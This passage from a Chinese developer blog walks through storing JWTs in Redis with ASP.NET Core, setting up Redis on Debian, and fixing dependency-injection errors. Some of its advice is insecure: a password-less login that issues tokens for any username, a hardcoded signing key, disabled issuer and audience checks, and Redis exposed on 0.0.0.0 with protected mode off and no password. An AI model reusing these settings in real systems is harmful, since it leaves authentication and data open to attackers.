class="line">builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)</span><br><span class="line">    .AddJwtBearer(options =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        options.TokenValidationParameters = <span class="keyword">new</span> TokenValidationParameters</span><br><span class="line">        &#123;</span><br><span class="line">            ValidateIssuerSigningKey = <span class="literal">true</span>,</span><br><span class="line">            IssuerSigningKey = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)),</span><br><span class="line">            ValidateIssuer = <span class="literal">false</span>,</span><br><span class="line">            ValidateAudience = <span class="literal">false</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">builder.Services.AddAuthorization();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = builder.Build();</span><br><span class="line">app.UseAuthentication();</span><br><span class="line">app.UseAuthorization();</span><br><span class="line"></span><br><span class="line">app.MapControllers();</span><br><span class="line"></span><br><span class="line">app.Run();</span><br></pre></td></tr></table></figure><h2 id="2-生成和存储-JWT"><a href="#2-生成和存储-JWT" class="headerlink" title="2. 生成和存储 JWT"></a>2. 生成和存储 JWT</h2><p>在 Controller 中生成 JWT 并将其存储到 Redis。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Mvc;</span><br><span class="line"><span class="keyword">using</span> Microsoft.IdentityModel.Tokens;</span><br><span class="line"><span class="keyword">using</span> StackExchange.Redis;</span><br><span class="line"><span class="keyword">using</span> System.IdentityModel.Tokens.Jwt;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="string">&quot;api/[controller]&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AuthController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IConnectionMultiplexer _redis;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="built_in">string</span> _jwtKey = <span class="string">&quot;YourSecretKeyForJwt&quot;</span>; <span class="comment">// 替换为你的密钥</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AuthController</span>(<span class="params">IConnectionMultiplexer redis</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _redis = redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">HttpPost(<span class="string">&quot;login&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">Login</span>(<span class="params"><span class="built_in">string</span> username</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建 JWT token</span></span><br><span class="line">        <span class="keyword">var</span> claims = <span class="keyword">new</span>[]</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">new</span> Claim(ClaimTypes.Name, username)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> key = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_jwtKey));</span><br><span class="line">        <span class="keyword">var</span> creds = <span class="keyword">new</span> SigningCredentials(key, SecurityAlgorithms.HmacSha256);</span><br><span class="line">        <span class="keyword">var</span> token = <span class="keyword">new</span> JwtSecurityToken(</span><br><span class="line">            claims: claims,</span><br><span class="line">            expires: DateTime.UtcNow.AddHours(<span class="number">1</span>),</span><br><span class="line">            signingCredentials: creds);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> jwt = <span class="keyword">new</span> JwtSecurityTokenHandler().WriteToken(token);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 token 存储到 Redis</span></span><br><span class="line">        <span class="keyword">var</span> db = _redis.GetDatabase();</span><br><span class="line">        db.StringSet(<span class="string">$&quot;jwt:<span class="subst">&#123;username&#125;</span>&quot;</span>, jwt, TimeSpan.FromHours(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok(<span class="keyword">new</span> &#123; token = jwt &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-验证-JWT"><a href="#3-验证-JWT" class="headerlink" title="3. 验证 JWT"></a>3. 验证 JWT</h2><p>在中间件或验证逻辑中从 Redis 检查 JWT 是否有效。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpGet(<span class="string">&quot;validate&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> IActionResult <span class="title">ValidateToken</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> authHeader = Request.Headers[<span class="string">&quot;Authorization&quot;</span>].ToString();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(authHeader) || !authHeader.StartsWith(<span class="string">&quot;Bearer &quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> Unauthorized();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> token = authHeader.Replace(<span class="string">&quot;Bearer &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> username = User.Identity?.Name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> db = _redis.GetDatabase();</span><br><span class="line">    <span class="keyword">var</span> storedToken = db.StringGet(<span class="string">$&quot;jwt:<span class="subst">&#123;username&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (storedToken.IsNullOrEmpty || storedToken != token)</span><br><span class="line">        <span class="keyword">return</span> Unauthorized();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Ok(<span class="string">&quot;Token is valid&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-Token-失效机制"><a href="#4-Token-失效机制" class="headerlink" title="4. Token 失效机制"></a>4. Token 失效机制</h2><p>利用 Redis 的 TTL 设置 token 的自动过期：</p><p>在存储 token 时设置过期时间。<br>用户注销时可以手动删除 Redis 中的 token。<br>注销示例：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">HttpPost(<span class="string">&quot;logout&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> IActionResult <span class="title">Logout</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> username = User.Identity?.Name;</span><br><span class="line">    <span class="keyword">var</span> db = _redis.GetDatabase();</span><br><span class="line">    db.KeyDelete(<span class="string">$&quot;jwt:<span class="subst">&#123;username&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Ok(<span class="string">&quot;Logged out&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过 Redis 存储 JWT，可以实现以下功能：</p><p>集中管理 JWT：便于实时撤销或查询。<br>自动过期：Redis 自带 TTL，可以简化 token 的管理。<br>扩展性好：适用于分布式系统。<br>根据实际需求，还可以扩展功能，例如黑名单机制或支持多设备登录等。</p><!-- <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">JwtHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IConfiguration _configuration;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IDatabase _redisDatabase;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> Token配置</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;configuration&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JwtHelper</span>(<span class="params">IConfiguration configuration</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _configuration = configuration;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接Redis并获取数据库实例，这里假设使用默认配置和数据库索引0</span></span><br><span class="line">        <span class="keyword">var</span> redis = ConnectionMultiplexer.Connect(_configuration[<span class="string">&quot;Redis:ConnectionString&quot;</span>]);</span><br><span class="line">        _redisDatabase = redis.GetDatabase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 创建Token并将其存储到Redis中，这里面可以保存自己想要的信息</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;username&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;uid&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">CreateTokenIDAndStoreInRedis</span>(<span class="params"><span class="built_in">string</span> username, <span class="built_in">string</span> uid</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        DateTime dt1 = DateTime.Now;</span><br><span class="line">        DateTime dt2 = DateTime.Now.AddHours(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 1. 定义需要使用到的Claims</span></span><br><span class="line">            <span class="keyword">var</span> claims = <span class="keyword">new</span>[]</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">new</span> Claim(<span class="string">&quot;username&quot;</span>, username),</span><br><span class="line">                <span class="keyword">new</span> Claim(<span class="string">&quot;uid&quot;</span>, uid),</span><br><span class="line">                <span class="comment">/* 可以保存自己想要信息，传参进来即可</span></span><br><span class="line"><span class="comment">                new Claim(&quot;sex&quot;, &quot;sex&quot;),</span></span><br><span class="line"><span class="comment">                new Claim(&quot;limit&quot;, &quot;limit&quot;),</span></span><br><span class="line"><span class="comment">                new Claim(&quot;head_url&quot;, &quot;xxxxx&quot;)</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 2. 从 appsettings.json 中读取SecretKey</span></span><br><span class="line">            <span class="keyword">var</span> secretKey = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[<span class="string">&quot;Jwt:SecKey&quot;</span>]));</span><br><span class="line">            <span class="comment">// 3. 选择加密算法</span></span><br><span class="line">            <span class="keyword">var</span> algorithm = SecurityAlgorithms.HmacSha256;</span><br><span class="line">            <span class="comment">// 4. 生成Credentials</span></span><br><span class="line">            <span class="keyword">var</span> signingCredentials = <span class="keyword">new</span> SigningCredentials(secretKey, algorithm);</span><br><span class="line">            <span class="comment">// 5. 根据以上，生成token</span></span><br><span class="line">            <span class="keyword">var</span> jwtSecurityToken = <span class="keyword">new</span> JwtSecurityToken(</span><br><span class="line">                _configuration[<span class="string">&quot;Jwt:Issuer&quot;</span>],    <span class="comment">//Issuer</span></span><br><span class="line">                _configuration[<span class="string">&quot;Jwt:ExpireSeconds&quot;</span>],  <span class="comment">//ExpireSeconds</span></span><br><span class="line">                claims,                          <span class="comment">//Claims,</span></span><br><span class="line">                dt1,                    <span class="comment">//notBefore</span></span><br><span class="line">                dt2,     <span class="comment">//expires</span></span><br><span class="line">                signingCredentials               <span class="comment">//Credentials</span></span><br><span class="line">            );</span><br><span class="line">            <span class="comment">// 6. 将token变为string</span></span><br><span class="line">            <span class="keyword">var</span> token = <span class="keyword">new</span> JwtSecurityTokenHandler().WriteToken(jwtSecurityToken);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将生成的JWT存储到Redis中，以uid作为键，设置过期时间为JWT的有效期</span></span><br><span class="line">            <span class="keyword">var</span> expirationSeconds = (dt2 - dt1).TotalSeconds;</span><br><span class="line">            _redisDatabase.StringSet(uid, token, TimeSpan.FromSeconds(expirationSeconds));</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span>/ log tktklogtk</span></span><br><span class="line">            <span class="comment">//Console.WriteLine(&quot;userlogin &quot; + username + &quot; ID &quot; + uid + &quot; &quot; + dt1 + &quot; ~ &quot; + dt2 + &quot;  &quot; + token);</span></span><br><span class="line">            <span class="keyword">return</span> token;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 从Redis中读取JWT并解密获取信息</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;uid&quot;&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">ReadAndDecryptTokenFromRedis</span>(<span class="params"><span class="built_in">string</span> uid</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> token = _redisDatabase.StringGet(uid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(token))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> JWToken = JwtDecrypt(token);</span><br><span class="line">            <span class="keyword">return</span> JWToken;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以下是原有的方法，如CreateToken、ReaderToken、GetUid、JwtDecrypt等方法保持不变，此处省略重复代码展示</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">YourController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> JwtHelper _jwt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YourController</span>(<span class="params">JwtHelper jwt</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _jwt = jwt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建并存储JWT到Redis的方法</span></span><br><span class="line">    [<span class="meta">HttpPost</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">CreateAndStoreToken</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 假设这里从请求中获取到了username和userID等信息，示例中直接赋值</span></span><br><span class="line">        <span class="built_in">string</span> username = <span class="string">&quot;example_username&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> userID = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> token = _jwt.CreateTokenIDAndStoreInRedis(username, userID);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok(<span class="keyword">new</span> &#123; token &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从Redis读取并解密JWT获取信息的方法</span></span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">ReadTokenFromRedis</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 假设这里从请求中获取到了要读取的用户的uid，示例中直接赋值</span></span><br><span class="line">        <span class="built_in">string</span> uid = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> JWToken = _jwt.ReadAndDecryptTokenFromRedis(uid);</span><br><span class="line">        <span class="built_in">string</span> tkuid = _jwt.GetUid(JWToken);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok(<span class="keyword">new</span> &#123; JWToken, tkuid &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># debian redis setup</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># 1: 更新软件包列表</span></span><br><span class="line">首先，确保的软件包列表是最新的。打开终端并执行以下命令：</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h1 id="2-安装Redis"><a href="#2-安装Redis" class="headerlink" title="2: 安装Redis"></a>2: 安装Redis</h1><p>更新完软件包列表后，可以通过apt包管理器来安装Redis服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure><p>这将安装Redis及其依赖项，并自动启动Redis服务。</p><h1 id="3-检查Redis状态"><a href="#3-检查Redis状态" class="headerlink" title="3: 检查Redis状态"></a>3: 检查Redis状态</h1><p>安装完成后，可以检查Redis服务是否正在运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status redis-server</span><br></pre></td></tr></table></figure><p>如果服务正在运行，会看到类似“active (running)”的状态信息。</p><h1 id="4-配置Redis"><a href="#4-配置Redis" class="headerlink" title="4: 配置Redis"></a>4: 配置Redis</h1><p>Redis的配置文件位于&#x2F;etc&#x2F;redis&#x2F;redis.conf。可能想要编辑这个文件来更改默认设置，例如绑定地址、端口号、要求密码等。使用文本编辑器打开它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/redis/redis.conf</span><br></pre></td></tr></table></figure><p>做出必要的更改后保存文件并退出编辑器。</p><h1 id="5-重启Redis服务"><a href="#5-重启Redis服务" class="headerlink" title="5: 重启Redis服务"></a>5: 重启Redis服务</h1><p>如果对配置文件做了任何修改，记得重启Redis服务以使更改生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis-server</span><br></pre></td></tr></table></figure><h1 id="6-设置Redis开机自启"><a href="#6-设置Redis开机自启" class="headerlink" title="6: 设置Redis开机自启"></a>6: 设置Redis开机自启</h1><p>为了确保Redis在系统启动时自动启动，可以使用以下命令启用开机自启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> redis-server</span><br></pre></td></tr></table></figure><h1 id="7-测试Redis安装"><a href="#7-测试Redis安装" class="headerlink" title="7: 测试Redis安装"></a>7: 测试Redis安装</h1><p>可以通过连接到本地Redis服务器来测试安装是否成功。使用redis-cli命令行工具连接到Redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br></pre></td></tr></table></figure><p>一旦进入Redis CLI，可以尝试运行ping命令，如果Redis服务器响应PONG，则说明安装和配置都正常工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure><h2 id="Redis-配置文件"><a href="#Redis-配置文件" class="headerlink" title="Redis 配置文件"></a>Redis 配置文件</h2><p>编辑 Redis 的配置文件（通常是 &#x2F;etc&#x2F;redis&#x2F;redis.conf）。</p><p>确保允许远程连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（默认仅允许本地连接，127.0.0.1）。<br>确保未设置 protected-mode 为 yes，或者明确配置授权规则：</p><p>protected-mode no<br>重启 Redis 服务以应用更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><h1 id="err"><a href="#err" class="headerlink" title="err"></a>err</h1><h2 id="500-Undocumented"><a href="#500-Undocumented" class="headerlink" title="500 Undocumented"></a>500 Undocumented</h2><p>Error: Internal Server Error<br>Response body<br>System.InvalidOperationException: Multiple constructors accepting all given argument types have been found in type ‘userApiController’. There should only be one applicable constructor.<br>   at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.TryFindMatchingConstructor(Type instanceType, Type[] argumentTypes, ConstructorInfo&amp; matchingConstructor, Nullable<code>1[]&amp; parameterMap)    at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.FindApplicableConstructor(Type instanceType, Type[] argumentTypes, ConstructorInfo&amp; matchingConstructor, Nullable</code>1[]&amp; matchingParameterMap)<br>   at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.CreateFactoryInternal(Type instanceType, Type[] argumentTypes, ParameterExpression&amp; provider, ParameterExpression&amp; argumentArray, Expression&amp; factoryExpressionBody)</p><p>问题是由于依赖注入系统在实例化 userApiController 时发现有多个构造函数可以匹配传递的参数，因此无法确定使用哪个构造函数。这种情况会导致 System.InvalidOperationException 异常。多个改成一个。 </p><h2 id="System-InvalidOperationException-、"><a href="#System-InvalidOperationException-、" class="headerlink" title="System.InvalidOperationException: 、"></a>System.InvalidOperationException: 、</h2><p>Unable to resolve service for type ‘JwtHelper’ while attempting to activate ‘userApiController’.<br>   at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.ThrowHelperUnableToResolveService(Type type, Type requiredBy)<br>   at lambda_method69(Closure, IServiceProvider, Object[])</p><p>这个错误表明 wtHelper 类型未在依赖注入 (DI) 容器中注册，而 IM.Controllers.userApiController 需要它作为依赖。DI 系统在尝试解析 JwtHelper 时失败，导致 Internal Server Error。</p><p><strong>检查依赖注册</strong><br>确保在 Program.cs 或 Startup.cs 文件中注册了 JwtHelper 服务。如果 JwtHelper 是一个自定义工具类或服务，你需要将它添加到 DI 容器中。</p><p>builder.Services.AddScoped<JwtHelper>();<br>如果 JwtHelper 需要构造函数注入的依赖项，也要确保这些依赖已注册。<br>如果 JwtHelper 是无状态的，考虑使用 AddSingleton。</p><h2 id="StackExchange-Redis-RedisConnectionException"><a href="#StackExchange-Redis-RedisConnectionException" class="headerlink" title="StackExchange.Redis.RedisConnectionException:"></a>StackExchange.Redis.RedisConnectionException:</h2><p>“It was not possible to connect to the redis server(s). Error connecting right now. To allow this multiplexer to continue retrying until it’s able to connect, use abortConnect&#x3D;false in your connection string or AbortOnConnectFail&#x3D;false; in your code.”</p><p>检查 Redis 的配置文件（通常是 &#x2F;etc&#x2F;redis&#x2F;redis.conf）。<br><strong>确保允许远程连接</strong>：<br>bind 0.0.0.0<br> .Connect(“XXXX:6379,abortConnect&#x3D;false”));</p><p>重启redis</p><h1 id="Redis-保护模式"><a href="#Redis-保护模式" class="headerlink" title="Redis 保护模式"></a>Redis 保护模式</h1><p>Redis 处于保护模式，默认情况下禁止外部连接。</p><h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><p>修改 redis.conf 中的 protected-mode 设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p>重启 Redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl 